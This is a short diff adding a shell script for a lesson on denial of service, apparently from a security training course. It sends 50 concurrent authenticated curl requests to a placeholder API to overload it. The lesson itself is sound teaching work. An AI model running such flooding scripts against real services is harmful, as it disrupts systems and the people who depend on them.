@@ -1,0 +1,12 @@
+# Lesson 6 – Denial of Service (DoS)
+
+# Send multiple concurrent requests to overload the API
+
+for i in {1..50}; do
+  curl -s "$API" \
+  -H "content-type: application/json" \
+  -H "authorization: $TOKEN_A" \
+  --data-raw '{"action":"orders"}' &
+done
+
+wait
